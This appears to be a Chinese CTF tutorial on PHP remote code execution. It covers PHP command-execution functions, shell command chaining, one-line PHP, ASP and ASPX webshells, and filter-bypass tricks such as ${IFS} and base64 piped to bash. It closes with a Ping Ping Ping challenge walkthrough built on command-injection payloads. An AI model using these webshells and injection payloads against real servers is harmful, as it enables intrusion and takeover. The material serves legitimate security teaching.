<meta name="referrer" content="no-referrer">

# 课前准备

1. 准备一个自己喜欢的笔记软件，记录自己学习知识
2. 学习和了解基本Linux命令，准备好一个linux环境
3. 学习基础的PHP语法和PHP环境
4. 了解Base64、url编码

# 基础学习

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzAwMDlmMzY0NDAxZmIyOTY3ZGM2ZDBmOWRjZWNjYWVfc0VBR0p3aGhHUEVTakhXRktWZ3Y0eENtdDd0eVQ2bm5fVG9rZW46Undud2JYVWNPb25tYzJ4VUFlaGNJSlhybktnXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

说明和介绍：

一些对RCE的介绍

https://www.cloudflare.com/zh-cn/learning/security/what-is-remote-code-execution/

## 简单介绍

RCE 指的是 **远程代码执行**（Remote Code Execution）

CTF中RCE主要的几种类型

1. 任意代码执行
2. 无字母RCE
3. 无参数RCE
4. 无回显命令执行

## Linux

> 这是一个很丰富的研究，三眼两语难以讲述，需要我们不断持续的学习和实践，也许有一天会爱上Linux
>
> 一切皆文件

### 初步了解

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjdmODVkNGI3ODdmNGQ1ZmQ5NmFlZjYyOGNhZGMwYTJfcEE5V3ZwSUhlZUpyWW54S2pyb3dxa2xQMkRJRVlHRWtfVG9rZW46WkdGWGJ2ZDlub2Y4MjV4aFhkN2NvbG1QbklkXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

**什么是 Linux？**

简单来说，Linux 是一种开源的操作系统。它就像电脑的“灵魂”，控制着硬件并运行各种软件。更准确地说，Linux 最初指的是操作系统的内核（Kernel），是核心部分。但我们常说的“Linux”，通常指的是基于 Linux 内核构建的完整操作系统，它包含各种工具、应用程序和图形界面等。

**Linux 的应用场景：**

- **服务器：** 网站、应用程序、数据库等。
- **嵌入式****系统：** 路由器、智能电视、安卓手机等。
- **个人电脑：** 一些用户选择 Linux 桌面操作系统。
- **超级计算机：** 几乎所有超级计算机都运行 Linux。

**Linux发行版本**

- Ubuntu-以其用户友好性、强大的社区支持和丰富的软件库而闻名   https://ubuntu.com/
- Kail linux --专门为 **渗透测试****、安全审计和****数字取证** 而设计。它预装了大量的安全工具，涵盖了信息安全领域的各种任务，因此也被称为“黑客操作系统”。
- https://www.kali.org/

环境配置

- VMware虚拟机
- WSL

> WSL（Windows Subsystem for Linux，Windows 下的 Linux 子系统）是 Microsoft 提供的一种功能，允许用户在不使用虚拟机或双系统的情况下，在 Windows 上运行原生的 Linux 环境。它使开发者可以直接在 Windows 中运行 Linux 命令行工具、脚本和程序，同时与 Windows 文件系统无缝集成。

- 或者是服务器平台

### 文件目录结构

树状目录结构：

在 Linux 或 Unix 操作系统中，所有的文件和目录都被组织成以一个根节点开始的倒置的树状结构。

文件系统的最顶层是由根目录开始的，系统使用 **/** 来表示根目录。在根目录之下的既可以是目录，也可以是文件，而每一个目录中又可以包含子目录文件。如此反复就可以构成一个庞大的文件系统。

> Windows 的文件结构以 **层级目录树** 的形式组织，根目录通常为一个盘符（例如 `C:\`）

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTU1M2Y4ZTFkMTNmZDgwYTAzZTE5OWUxYzdlYzBkYTBfOUNJeWdnY1ZyR2lwQ1JvT21ZQmlIbm0xemQ5TTU1WWdfVG9rZW46U2VsWmIyZ2JBb1UzcW54YjhnaWNGUDdJbmljXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

**根目录** **`/`****：** 它是整个文件系统的顶层目录，所有其他目录都挂载在这个目录下。

**目录（Directory）：** 类似于 Windows 的文件夹，用于组织和存储文件。

**文件（File）：** 存储实际数据的地方，可以是文本文件、程序文件、图像文件等等。

**路径（Path）：** 用于定位文件或目录的字符串，例如 `/home/user/documents/file.txt`。

- **绝对路径：** 从根目录 `/` 开始的完整路径，例如 `/etc/passwd`。
- **相对路径：** 相对于当前目录的路径，例如 `documents/file.txt`（如果当前目录是 `/home/user`）。

### 基础命令

学习 Linux 离不开命令行（终端），以下是一些最常用的命令：

1. **`ls`****：列出目录内容**
   1. `ls`：列出当前目录的文件和文件夹。
   2. `ls -l`：以详细列表形式显示。
   3. `ls -a`：显示所有文件，包括隐藏文件。
2. **`cd`****：切换目录**
   1. `cd 目录名`：进入指定目录。
   2. `cd ..`：返回上一级目录。
   3. `cd ~`：回到用户的主目录。
3. **`pwd`****：显示当前所在目录**
4. **`mkdir`****：创建目录**
   1. `mkdir 目录名`：创建一个新的目录。
5. **`rmdir`****：删除空目录**
   1. `rmdir 目录名`：删除一个空的目录。
6. **`rm`****：删除文件或目录**
   1. `rm 文件名`：删除文件。
   2. `rm -r 目录名`：递归删除目录及其内容（谨慎使用）。
7. **`cp`****：复制文件或目录**
   1. `cp 源文件 目标文件`：复制文件。
   2. `cp -r 源目录 目标目录`：复制目录。
8. **`mv`****：移动或重命名文件或目录**
   1. `mv 源文件 目标文件`：重命名文件。
   2. `mv 源文件 目标目录`：移动文件到目标目录。
9. **`cat`****：查看文件内容**
10. **`man`****：查看命令帮助**
    1. `man 命令名`：查看该命令的详细使用手册。

## PHP中危险函数

#### evel（）函数

`eval()` 函数是 PHP 中一个非常特殊的函数，它可以将一个字符串当作 PHP 代码来执行。这个功能非常强大，但也非常危险，如果使用不当，可能会导致严重的安全问题。

**`eval()`** **函数的语法：**

```PHP
eval ( string $code ) : mixed
```

- `$code`：要执行的 PHP 代码字符串。

**`eval()`** **函数的作用：**

`eval()` 函数会将 `$code` 字符串中的内容解析为 PHP 代码，并执行它。执行的代码会继承 `eval()` 函数所在行的变量作用域。也就是说，在 `eval()` 中可以访问和修改 `eval()` 函数外部的变量。

**`eval()`** **函数的返回值：**

- 如果没有在代码字符串中使用 `return` 语句，则 `eval()` 返回 `NULL`。
- 如果在代码字符串中使用了 `return` 语句，则 `eval()` 返回传递给 `return` 语句的值。
- 从 PHP 7 开始，如果执行的代码中存在解析错误，`eval()` 会抛出 `ParseError` 异常。

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTI4YWQ3ODUyOGVhNzEyMmM4ZTQ2ZWQxMDcwOWIwN2VfRWdLSkw1MDFwY1gxOWtrWlRYamN2RDdkU2hoZ2doSW1fVG9rZW46WEc3RGJuWkV0b0lCTTh4bmpTVWNNSnRxbmRiXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

### 回显型

#### system()

> https://www.php.net/manual/zh/function.system.php
>
> System
>
> (PHP 4, PHP 5, PHP 7, PHP 8)
>
> system — 执行外部程序，并且显示输出

```PHP
system(string $command, int &$result_code = null): string|false
```

实例代码:

```PHP
<?php
$output = system('ls -l', $retval);
echo "Output:\n" . $output."\n";
echo "Return Value: \n" . $retval;
?>
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=NmI0ODY1NDBlNGNmOGVhYzkwYTAwZTkwMWUwY2IyZjlfdDh1blNFZlNncWw4M1VuY0lON2FmV1A5bmxaVHpPTWRfVG9rZW46S0dEdGJ5RjV5bzlUa2Z4bFoyRGNBM1FiblFoXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

#### Passthru

> https://www.php.net/manual/zh/function.passthru.php
>
> (PHP 4, PHP 5, PHP 7, PHP 8)
>
> passthru — 执行外部程序并且显示原始输出

```PHP
passthru(string $command, int &$result_code = null): ?false
```

实例代码：

```PHP
<?php
passthru("ls /");
passthru("whoami");
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=MWM3ZGNlMTY5NWQ5NTRjNTEzYTQzODJjNjhlZjk4NzdfM1RKSGZLZndhTTY2Q3VIWTVOT2dVY1RVdWY1ZnJhQUJfVG9rZW46VEZnaGJGSXJsb245bld4UkRyMmNqY2pEbjVNXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

#### pcntl_exec()

> `pcntl_exec()` 是 PHP 的一个函数，用于在 *当前进程空间* 执行指定的程序。它属于 PHP 的 Process Control 扩展（pcntl），主要用于处理 Unix/Linux 系统中的进程管理。与之前提到的 `system()`、`exec()`、`shell_exec()` 等函数不同，`pcntl_exec()` **不会创建新的****子进程**，而是 *替换* 当前进程。这意味着调用 `pcntl_exec()` 之后，原来的 PHP 脚本将停止执行，取而代之的是执行指定的程序。

函数原型：

`$path`: 要执行的程序的路径。可以是绝对路径或相对路径。

`$args`: （可选）传递给程序的参数数组。

`$envs`: （可选）传递给程序的环境变量数组。

```PHP
bool pcntl_exec ( string $path [, array $args [, array $envs ]] )
```

几个简单的例子：

```PHP
<?php

// 执行 ls 命令，列出当前目录的文件
pcntl_exec("/bin/ls", ["-l"]);

// 如果 pcntl_exec 执行成功，以下代码不会被执行
echo "This line will not be printed.\n";

?>
```

正常情况下：不会输出回显

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjJlZWYyMzNjNjc1NzkyZGE0MzdhNTk3YzBjNjg4MjNfRGxYNkU4dkJjMWNIaHpUUVFDSHl4U2NUNjFGSURUVktfVG9rZW46R2tEemIzQmxFb3VtQkF4N3NqVmNYRmJlbjhjXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

可以采用：

1. 

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=MmFmZTNhMzlmNzMyOTkxNmExNWNiNDkwNTIxNWY0NDJfVVFPQ1NCUTM3a0pEZ1NXRmJTNEFhMzdnTGYxelRsb2RfVG9rZW46Q0pIY2JBY0dlbzZVVTR4YTFLbGN3eEhPbjRmXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

### 无回显

#### exec()

**基本语法：**

```PHP
string exec ( string $command , array &$output = null , int &$return_var = null ) : string
```

- `$command`:  要执行的命令，可以是任何有效的系统命令。
- `$output`:  可选参数，用于存储命令执行的输出结果。每行输出将作为数组的一个元素。
- `$return_var`: 可选参数，用于存储命令执行后的返回状态码。通常，状态码 0 表示命令成功执行。

***函数特性：***

**返回最后一行输出：** `exec()` 函数只返回命令输出的最后一行。

**不显示输出：**  `exec()`  本身不会将命令输出打印到屏幕上。如果需要显示输出，可以使用 `echo` 或 `print_r` 等函数处理 `$output` 数组。

例子：

正常情况下：不会输出回显

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGJkYjRiMGQyOTNhNGJmMzVmZDcwNGM3MDRiMTA1NTBfd1cwNkg3d0NuR05zWjhrTG5IWldhQzQzeWRjYWtkNk9fVG9rZW46T0hIU2JjM3pLb1pLcXJ4RDlXWmMxbWN2bkRnXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

可以采用：

1. 保存变量

```PHP
<?php
exec('ls -l', $output);
print_r($output);
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDMwNzNhYzRhNTVkMDg1YzcxYzM3YzA2NTgwY2IwZDdfQkVoOFlpQlBiY3lyOTNrMDZGU05tUlU3Y1Nya29kU2pfVG9rZW46R3N0amJ1Z3A5b05GQU14WXIwWGM0T2t1bmRmXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

1. var_dump

> `var_dump()` 是 PHP 中一个非常有用的内置函数，主要用于输出变量的详细信息，包括变量的类型和值。它在调试代码和分析变量状态时非常有用。
>
> **`var_dump()`** **的作用：**
>
> - **显示变量的类型：** 例如，`int`（整型）、`string`（字符串）、`bool`（布尔型）、`array`（数组）、`object`（对象）等。
> - **显示变量的值：** 输出变量的具体内容。
> - **递归****展开数组和对象：** 对于数组和对象，`var_dump()` 会递归地显示其内部的元素和属性，并使用缩进清晰地展示其结构。
> - **显示字符串的长度：** 如果变量是字符串，还会显示字符串的长度。

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTMzMmY1YWU5ZDM1ODc0MWMyMjhkYzE1YjBlYTQ1ODdfb2tvSURjR0RLVWU2VjdQcEFzTkp3U1YxMHBPWU1CcEFfVG9rZW46S2E5b2JtaXhHb3BQbmF4UkN3RGNrZ3ZobnpjXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

执行命令

- `code .` 在vscode中打开当前目录

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=N2U0YjViZmRkNmFiMzU3Y2RjYzI2NDIxMDJkNjJiYmFfdk43QW05QmtWMk1mUTcyRjh2YjZWUm5CRUFhQXMzSTVfVG9rZW46QkNGV2JnaHRTb3JleGN4QzZrVmN1MTM1blJjXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

- `calc` 召唤计算器

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTI5NThiNWRhOGM3Yjk3NGE3YTcxYzBjOTVmMTUyNTVfaUJJNVJ4YTJqaXhvMUZBMmhkOUZ5SzR4SVRwUHVSekFfVG9rZW46QTlUamIzNEhVb3FYbDN4dHFZRmNsOG05bmFoXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

### 执行运算符

官方解释：

PHP 支持一个执行运算符：反引号。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“`”的效果与函数 [shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php) 相同。

```Plain
<?php$output = `ls -al`;echo "<pre>$output</pre>";?>
```

> **注意**:
>
> 关闭了 [shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php) 时反引号运算符是无效的。

> **注意**:
>
> 与其它某些语言不同，反引号不能在双引号字符串中使用。

使用例子：

- 列出当前目录文件

```PHP
<?php
// 在 Linux 或 macOS 中使用 `ls` 命令
$output = `dir`;
echo "<pre>$output</pre>";
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=NWE0MDUxYWRjYWQyNzViYzMwNmU5ZmE2OTEzNTQ3NzJfWXpGODB2U2phUjZ2S1dRRHVuVEVzNkJZcUE2a0FYZWtfVG9rZW46TmdDOGJCRW1ob3JrV1F4ck9BemNkOEJ3blJjXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

- 获取系统时间

```PHP
<?php// 获取系统当前时间
$time = `date`; 
echo "当前系统时间：$time";
```

- 检测ping

```PHP
<?php
// 使用 `ping` 测试网络连通性
$host = 'bx33661.com';
$output = `ping -c 4 $host`; // Linux/macOS 使用 -c 指定次数
echo "<pre>$output</pre>";
```

## 技巧

#### 文件读取

**cat**：连接文件并打印到标准输出。这是最常用的查看文件内容的命令，会将整个文件内容一次性显示出来。

- `cat filename`：显示文件内容。
- `cat -n filename`：显示文件内容并显示行号。
- `cat file1 file2`：连接 file1 和 file2 并显示。

**more**：分页显示文件内容。按空格键向下翻页，按 q 键退出。

**less**：与 more 类似，但功能更强大，支持上下翻页（使用 Page Up 和 Page Down 键），搜索等功能。推荐使用 less 代替 more。

**head**：显示文件的前几行，默认显示前 10 行。

- `head filename`：显示文件前 10 行。
- `head -n 20 filename`：显示文件前 20 行。

**tail**：显示文件的后几行，默认显示后 10 行。

- `tail filename`：显示文件后 10 行。
- `tail -n 20 filename`：显示文件后 20 行。
- `tail -f filename`：实时跟踪文件尾部的更新，常用于查看日志文件。

**tac**：反向显示文件内容，从最后一行开始显示，是 cat 的反向操作。

**nl**：显示文件内容并显示行号，类似于 `cat -n`。

**od**：以不同的格式（如八进制、十六进制、二进制等）显示文件内容，常用于查看二进制文件。

- `od -x filename`：以十六进制显示文件内容。
- `od -b filename`：以八进制显示文件内容。

**vi****/vim**：文本编辑器，也可以用来查看文件内容。使用 vi/vim 打开文件后，可以使用各种命令进行浏览和编辑。

- `vi filename` 或 `vim filename`：打开文件。
- 在 vi/vim 中，可以使用 `/keyword` 进行搜索，按 n 查找下一个匹配项。

**sort**：对文件内容进行排序后输出。

- `sort filename`：按字母顺序排序。

**uniq**：去除文件中的重复行，通常与 sort 结合使用。

- `sort filename | uniq`：先排序再去重。

**file**：确定文件类型。

- `file filename`：显示文件类型。
- `file -f filelist`：从文件中读取文件名列表并逐个检查文件类型。如果遇到错误，会给出具体的错误信息，这印证了你提到的“报错出具体内容”。

#### 命令拼接符

1. **`;`** **(分号)：** 顺序执行多个命令，彼此之间没有依赖关系。无论前面的命令是否成功执行，后面的命令都会执行。

> **Linux 独有的**

```Bash
//yufa
command1 ; command2 ; command3

ls -l; pwd ; date
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTc0ZWY2YmM1NmVhZTg2MTEwNTYzYzA1NDhmZGQ3YmRfWUxjVEwzZk9hSVhFbkNLczZvN3dJT3MzS21QQjhOdzBfVG9rZW46R0I4dGJEMkJ4b2tLVDV4RU9JdWNqSmM1blVoXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

1. **`&&`** **(逻辑与)：** 只有前面的命令执行成功（返回状态码为 0），后面的命令才会执行。如果前面的命令执行失败（返回状态码非 0），则后面的命令不会执行

```Bash
command1 && command2 && command3

mkdir mydir && cd mydir && touch myfile.txt
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=YWVmOTU2MGMzZDQ4YTFmNGRkNDRlZjkzNTdkMzlhNzFfYU5lR1pNelFveTl0R3Qya2U4dko4WTIyZXNDUmVYVWVfVG9rZW46UHhYY2JSQ2lyb3MxSzd4TUFrRmNYUWg2bjVlXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

1. **`||`** **(逻辑或)：** 只有前面的命令执行失败（返回状态码非 0），后面的命令才会执行。如果前面的命令执行成功（返回状态码为 0），则后面的命令不会执行。

```Bash
//yufa
command1 || command2 || command3

ping bx33661.com || echo "Wrong!!!"
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc4ZTQ4ZDFiZmQ2MGI3NDBmNjkyMzNkYzNhNzBjMzVfbkF5eEdKOFZzZ0NVUDJWUG9OaGwzakt6b2NYdGF3M2hfVG9rZW46VjVFWmJDMHlqb094NEp4OGxSdWNpTk56bjFjXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

1. **`|`** **(管道符)：** 将前一个命令的输出作为后一个命令的输入。这用于将多个命令连接起来，形成一个处理数据的流水线。

```Bash
//yufa
command1 | command2 | command3

ls -l | grep "txt" | wc -l
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTM4NTBiZmZkMjQ1MjE3N2NmZDFlZTY3MTJhZDc1NDZfdXFDc1NNR2pGbVR1SmQ3aXBXWUZOMFJockxtSkRPd3JfVG9rZW46WWM0bmJQVks2b1FRVlB4TFdvMGNwQk8zbjdnXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

实战一下：

### 一个最简单的示例

```PHP
<?php 
include ("get_flag.php");
eval($_POST['a']);

highlight_file(__FILE__);

?>

//a = system("ls");
//a= system("cat get_flag.php");
```

常规解法

进一步学习：

### 一句话木马

**一句话木马** 是一种简短的恶意代码，通常用于在目标服务器上创建一个后门，以便攻击者远程控制该服务器或执行其他恶意操作。它主要出现在 Web 安全领域，特别是涉及 PHP、ASP、JSP 等动态语言的 Web 应用程序中。

```PHP
php的一句话木马： <?php @eval($_POST['cmd']);?>
asp的一句话是：   <%eval request ("cmd")%>
aspx的一句话是：  <%@ Page Language="Jscript"%> <%eval(Request.Item["cmd"],"unsafe");%>
```

对于PHP中的**解释**：

- `$_POST['cmd']`：从 HTTP POST 请求中获取参数值。
- `eval()`：将获取的参数作为代码执行。
- `@`：隐藏错误信息，增加隐蔽性

然后利用中国蚁剑这种连接shell的平台连接

https://github.com/AntSwordProject/   (具体安装自行搜索了）

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=NmYxMGYyZDUzNmNhNzE4NzM0MGM3MDE4Y2Q2ODEwMThfcXZ3ZWJZTDNTY0xBQnd3OFBnY2pFdzZiT0wxTDVoUnVfVG9rZW46Q2Y2cmJkRHVTb0FjZGV4ZkJ3eWNmcGFhbk1kXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

连接配置

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzEwZTk1M2ZiNDQ0Nzg0MmUyMmRiZjZlOTQzZmYzYzRfb3RnbFpEZGVpWWVPM1QzeGc0TnJkelVSaG9IcVE5MWFfVG9rZW46WnB5cGI5eEN1b0NaTHB4c21nSmNRZlFzbnpoXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

网站目录结构

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmIzMWY4ODFmNTc3ZGEyN2I1MGExOWUxOWI0ZjdhYjhfNlV4NExJQlhBakJROUF5QkJaeGtzRkNKUDFMVlpUNFJfVG9rZW46WFZOemJJdWN0b2l1Ykl4WnVhMWMxNWU4blViXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

虚拟shell终端

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=YzNiMjY4ZTJiZmNmMTEyOGJiYTBhNDcxZDQ0YWNjOGFfUUxocjgyeTloNEYxRDFkdnE1d1ltcG9IVTB0TXZCZ1lfVG9rZW46UVZkQWJhTXl5bzg5R094NkwySGNMMmRQbklpXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

## Bypass

#### 空格Bypass

在过滤了空格的系统中，以cat flag.txt为例，系统不允许我们输入空格或输入后被过滤。

- **`${IFS}`**
- ` $IFS$9 `(可以是别的)

> - **`$IFS`**: `$IFS` 是 "Internal Field Separator"（内部字段分隔符）的缩写。它是一个环境变量，用于定义 shell 在解释命令行参数或输入时如何分割字段（单词）。默认情况下，`$IFS` 包含空格、制表符和换行符。简单来说，它告诉 shell 如何区分不同的参数。
> - **`$9`**: `$9` 代表 shell 脚本的第九个命令行参数。如果在执行脚本时提供了九个或更多个参数，`$9` 就会包含第九个参数的值。如果没有提供第九个参数，`$9` 的值为空字符串。
>
> 现在我们来看` $IFS$9 `。它的作用是将 `$IFS` 和 `$9` 连接在一起。由于 `$9` 通常为空字符串，所以 $$IF$$`9` 实际上就等同于 `$IFS`。这个技巧的关键在于如何使用它来绕过空格过滤

可使用${IFS}代替空格。

```PHP
cat${IFS}flag.txt
cat$IFS$1flag.txt
cat${IFS}$1flag.txt
```

- **重定向符绕过(<>)**

```PHP
cat<>flag.txt
cat<flag.txt
```

- **%09(需要****php****环境)**

php环境下web输入%09等效于空格

```PHP
cat%09flag.txt
```

- **`%0a`****换行符**

#### 编码绕过

#### Base64

> 什么是 Base64 编码？
>
> Base64 编码是一种基于 64 个可打印字符来表示二进制数据的编码方式。它常用于在需要以文本形式传输或存储二进制数据的场景中，比如电子邮件、URL 参数、网络传输等。
>
> ------
>
> **Base64 编码的特点**
>
> 1. **字符集**： Base64 使用以下 64 个字符作为编码表：
>    1. **字母**：`A-Z`、`a-z`（共 52 个字符）
>    2. **数字**：`0-9`（共 10 个字符）
>    3. **两个符号**：`+` 和 `/`（共 2 个字符）
>    4. **填充符**：`=`（用于填充不足 3 字节的数据）
> 2. **数据块划分**：
>    1. Base64 将输入数据按 3 字节（24 位）为一组处理，每组被分成 4 个 6 位的块。
>    2. 每个 6 位的块被映射到 Base64 的编码字符集中。
> 3. **数据增长**：
>    1. Base64 编码会使数据膨胀，编码后的数据长度约为原始数据的 **4/3**。
>    2. 如果原始数据长度不是 3 的倍数，Base64 会使用填充符 `=` 补齐。

```PHP
echo xxxx|base64 -d|bash
```

使用反引号包含base64解码后的命令

```PHP
echo "Y2F0IGZsYWcudHh0Cg==" | base64 -d
```

将base64解码后的命令通过管道符传递给bash

```PHP
echo "Y2F0IGZsYWcudHh0Cg==" | base64 -d | bash
```

#### HEX编码

> HEX 编码（十六进制编码）是一种使用十六进制数字（`0-9` 和 `A-F`）来表示数据的编码方式。它将二进制数据转化为十六进制字符串，以方便存储、传输和显示。

在 Bash 中，可以使用 `xxd` 和 `printf` 等工具来对十六进制（hex）进行编码和解码。

##### 1. **将字符串编码为十六进制**

使用 `xxd` 将字符串转换为十六进制：

```Bash
echo -n "content" | xxd -p
```

- 示例：

```Bash
echo -n "bbbbbbx" | xxd -p
```

输出：

```Plain
62626262626278
```

##### 2. **将十六进制解码为字符串**

使用 `xxd` 将十六进制解码回字符串：

```Bash
echo -n "content" | xxd -r -p
```

- 示例：

```Bash
echo -n "62626262626278" | xxd -r -p
```

输出：

```Plain
bbbbbbx
```

##### 3. **使用** **`printf`** **进行十六进制解码**

如果没有 `xxd`，也可以使用 `printf` 解码十六进制：

```Bash
printf "%b" "\x68\x65\x6c\x6c\x6f"
```

- 示例：

```Bash
printf "%b" "\x68\x65\x6c\x6c\x6f"
```

输出：

```Plain
hello
```

#### 变量拼接

使用shell变量拼接被黑名单限制的关键词

```PHP
a=c;b=at;c=fl;d=ag;e=.txt;$a$b $c$d$e;
```

#### 单双引号

- 单引号----`''`
- 双引号---`""`
- 反斜杠--- `\`

我们可以通过`ca''t ca""t c"a"t ca\t`这样来bypass’

### 一道比较综合的例题

[GXYCTF2019]Ping Ping Ping

> 之前让大家做过一下

https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping

进入题目发现提示我们传入ip

```PHP
?ip=127.0.0.1;ls
?ip=127.0.0.1;tac flag.php
?ip=127.0.0.1;cat${IFS}flag.php 
?ip=127.0.0.1;cat$IFS$1flag.php
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGU0MzgzYTU1OWM3Yjk0ODU3YmNhODc1YjY3OGMxYmZfOFhPODhZYU9XNkp1QWFleExyaHF5VkdsdXVrWU90c3NfVG9rZW46UFhmSWJhUTZBb0JNeW54Um1XUWNaME5sbklnXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

我们简单地传入127.0.0.1,测试一下发现是可以ping的

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2RmNDBhMWNiNjg2MmY4NDBjNjM4ZmUwNTI1MmUzNjNfcjlTd1czV0tJVFdsMGh1VzRYRm1pSDd6TktVZ3Q0Mm9fVG9rZW46STNwZWJWY3FUb0lPUFZ4eGVzU2NDcXJvbkllXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

尝试命令执行

```PHP
?ip=127.0.0.1;ls
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=NmFlZjc5OWYzYjFlOTUzN2E3YTQ0Zjg1OTA1ZmM3OWRfdml4d1BrSGV6WWs3UXBXVlFlWUtpZ2E1aUhHMjV0RzNfVG9rZW46SUx2eWJQUnV1bzZyRE54VDF5TGNpZ3hnbllnXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

过滤空格

```PHP
?ip=127.0.0.1;cat flag.php
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=MGUyM2YwN2U3YWY2ZDI1ODgxNjBjYjY2M2U4NGE2NmVfT2NYZ01VR0lialhRS1pxbDJqWkJyanVrZHdDOVhhOUZfVG9rZW46RW5KM2JuZWhtbzlvbW54ZHBmcWM1NlJrbnFiXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

过滤一些符号---{}

```PHP
ip=127.0.0.1;cat${IFS}flag.php
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTQ2MTUzYWQ2NTk3ZWViZmIxMGMxYTg0MWY4YmUwYmRfV0hmbW1VN3JQdndoVEQyYmVJUVBDbHExMElHbkxJRXVfVG9rZW46VTlMRmJZSjhVb0tIeDN4NnJYZWM4c3NEbnljXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

过滤flag

```PHP
?ip=127.0.0.1;cat$IFS$9flag.php
?ip=127.0.0.1;cat$IFS$9fl''ag.php
?ip=127.0.0.1;cat$IFS$9fl*
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2U5N2FhMWE1NzliZWM4MzFlODBiY2EwMzU4OGU4NDFfalhxdVNrN1FZTUtDeEYwOFNlMUw2OUJuUHVKZW9QSENfVG9rZW46UWloZmIxczc0b09pdDR4V2lJa2Nsd3lPbjJlXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

查看一下index

```PHP
?ip=127.0.0.1;cat$IFS$9flag.php
```

看回显得到

```PHP
/?ip= 
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.078 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.112 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.101 ms
64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.113 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max = 0.078/0.101/0.113 ms
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}

?>
```

可以看到过滤规则

1. 

```PHP
?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash
